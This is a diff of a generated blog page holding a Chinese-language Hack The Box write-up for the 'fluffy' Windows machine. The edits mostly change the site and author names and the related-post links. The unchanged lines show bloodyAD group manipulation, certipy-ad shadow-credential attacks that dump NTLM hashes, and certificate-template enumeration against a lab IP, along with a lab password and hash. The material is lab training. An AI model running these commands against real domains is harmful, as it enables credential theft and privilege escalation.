@@ -17,14 +17,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>fluffy-htb - Hexo</title>
+  <title>fluffy-htb - tiantian</title>
 
   
     <meta name="description" content="fluffy-htb">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fluffy-htb">
 <meta property="og:url" content="http://example.com/2025/09/02/posts/fluffy-htb-w/">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="tiantian">
 <meta property="og:description" content="fluffy-htb">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/flu/n.png">
@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://example.com/images/flu/ad.png">
 <meta property="article:published_time" content="2025-09-01T16:00:00.000Z">
 <meta property="article:modified_time" content="2025-09-02T10:40:02.000Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:author" content="Starrui">
 <meta property="article:tag" content="ESC16">
 <meta property="article:tag" content="windows">
 <meta name="twitter:card" content="summary">
@@ -63,7 +63,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"dateCreated":"2025-09-02T00:00:00+08:00","dateModified":"2025-09-02T18:40:02+08:00","datePublished":"2025-09-02T00:00:00+08:00","description":"fluffy-htb","headline":"fluffy-htb","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/09/02/posts/fluffy-htb-w/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://example.com/2025/09/02/posts/fluffy-htb-w/","keywords":"windows, ESC16","image":[]}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Starrui","sameAs":[]},"dateCreated":"2025-09-02T00:00:00+08:00","dateModified":"2025-09-02T18:40:02+08:00","datePublished":"2025-09-02T00:00:00+08:00","description":"fluffy-htb","headline":"fluffy-htb","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/09/02/posts/fluffy-htb-w/"},"publisher":{"@type":"Organization","name":"Starrui","sameAs":[]},"url":"http://example.com/2025/09/02/posts/fluffy-htb-w/","keywords":"windows, ESC16","image":[]}</script>
   <link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
 </head>
 <body><div id="l_cover">
@@ -155,10 +155,10 @@
 <p>└─# bloodyAD -d fluffy.htb -u p.agila -p ‘prometheusx-303’ –dc-ip 10.10.11.69 add groupMember ‘SERVICE ACCOUNTS’ p.agila</p>
 <p>[+] p.agila added to SERVICE ACCOUNTS  成功添加</p>
 <p>获得winrm用户的hash</p>
-<p>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#x2e;&#97;&#x67;&#x69;&#108;&#97;&#64;&#x66;&#108;&#117;&#102;&#x66;&#x79;&#46;&#x68;&#116;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘winrm_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>certipy-ad shadow auto -u ‘<a href="mailto:&#112;&#46;&#x61;&#103;&#x69;&#108;&#x61;&#x40;&#x66;&#x6c;&#117;&#102;&#102;&#121;&#46;&#104;&#x74;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘winrm_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
 <p><img src="/../images/flu/win.png" alt="1"></p>
 <p>使用evil登录获得user.flag</p>
-<p>获取ca_svc用户 NTLM hash<br>certipy-ad shadow auto -u ‘<a href="mailto:&#x70;&#x2e;&#97;&#103;&#105;&#x6c;&#97;&#x40;&#102;&#108;&#117;&#102;&#102;&#121;&#46;&#x68;&#x74;&#x62;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘ca_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>获取ca_svc用户 NTLM hash<br>certipy-ad shadow auto -u ‘<a href="mailto:&#112;&#46;&#97;&#x67;&#105;&#x6c;&#x61;&#64;&#x66;&#x6c;&#117;&#102;&#x66;&#x79;&#46;&#104;&#x74;&#98;">p.agila@fluffy.htb</a>‘ -p ‘prometheusx-303’ -account ‘ca_svc’ -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
 <p><img src="/../images/flu/ca.png" alt="1"></p>
 <p>执行下面寻找有无漏洞命令提示不存在模板需要更新下需要更新版本</p>
 <p>certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</p>
@@ -231,7 +231,7 @@
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/09/02/posts/editor-htb/">Editor-htb</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/08/31/posts/k8s3/">K8s-3-靶场渗透</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/09/03/posts/poppips-mazasec/">poppips-mazasec</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/09/02/posts/editor-htb/">Editor-htb</a></div></section></div>
 
 
 
